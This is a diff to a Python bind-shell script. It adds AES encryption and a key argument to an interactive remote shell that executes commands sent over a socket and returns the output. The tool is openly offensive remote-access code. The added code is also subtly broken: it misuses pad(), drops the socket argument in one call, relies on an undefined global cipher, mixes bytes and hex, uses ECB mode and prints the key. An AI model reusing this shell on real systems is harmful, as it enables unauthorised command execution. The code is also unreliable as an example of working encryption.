@@ -13,6 +13,24 @@ from Crypto.Util.Padding import pad, unpad
 DEFAULT_PORT = 443
 MAX_BUFFER = 4096
 
+class AESCipher:
+    def __init__(self, key=None):
+        self.key = key if key else get_random_bytes(32)
+        self.cipher = AES.new(self.key, AES.MODE_ECB)
+    
+    def encrypt(self, plaintext):
+        return self.cipher.encrypt(pad(plaintext, AES))
+
+    def decrypt(self, encrypted):
+        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)
+
+    def __str__(self):
+        return f"Key: {self.key.hex()}"
+
+def encrypted_send(s, msg):
+    """Send an AES-encrypted message."""
+    s.send(cipher.encrypt(msg).encode('latin-1'))
+
 def execute_cmd(cmd):
     """Execute a Linux/Windows command."""
 
@@ -42,25 +60,19 @@ def cleanup(s):
 
 def shell_thread(s):
     """Multithreading interactive shell sesion."""
-    s.send(b"[ -- Connected -- ]")
+    encrypted_send(b"[ -- Connected -- ]")
     try:
         while True:
-            # Print prompt for Linux/Windows
-            if platform.system() == 'Linux':
-                s.send(b"\r\nEnter command> ")
-            elif platform.system() == 'Windows':
-                s.send(b"\nEnter command> ")
-            else:
-                print('The system must be Linux/Windows.')
-                cleanup(s)
-
+            encrypted_send(s, b"Enter command>")
             data = s.recv(MAX_BUFFER)
+
             if data:
-                buffer = decode_and_strip(data)
+                buffer= cipher.decrypt(decode_and_strip(data))
                 if not buffer or buffer == 'exit':
                     cleanup(s)
+
                 print(f"> Executing command: '{buffer}'")
-                s.send(execute_cmd(buffer))
+                encrypted_send(s, execute_cmd(buffer))
     except:
         print("shell_thread error. Terminating...")
         cleanup(s)
@@ -70,7 +82,7 @@ def send_thread(s):
     try:
         while True:
             data = input() + '\n'
-            s.send(data.encode('latin-1'))
+            encrypted_send(s, data.encode('latin-1'))
     except:
         print('send_thread error. Terminating...')
         cleanup(s)
@@ -81,7 +93,8 @@ def recv_thread(s):
         while True:
             data = decode_and_strip(s.recv(MAX_BUFFER))
             if data:
-                print('\n' + data, end='', flush=True)
+                data = cipher.decrypt(data).decode('latin-1')
+                print(data, end='', flush=True)
     except:
         print('recv_thread error. Terminating...')
         cleanup(s)
@@ -127,8 +140,27 @@ def main():
         help='Connect to a bind shell',
         required=False,
     )
+    # Usage: python3 bind_shell.py -c 127.0.0.1 -k 
+    # This is similar to nc 127.0.0.1 1337
+    parser.add_argument(
+        '-k',
+        '--key',
+        help='Encryption key',
+        required=False,
+    )
 
     args = parser.parse_args()
+
+    if args.connect and not args.key:
+        parser.error('Key is needed. Use -k <key>.')
+    
+    if args.key:
+        cipher = AESCipher(bytearray.fromhex(args.key))
+    else:
+        cipher = AESCipher()
+        
+    print(cipher)
+
     if args.listen:
         server()
     elif args.connect:
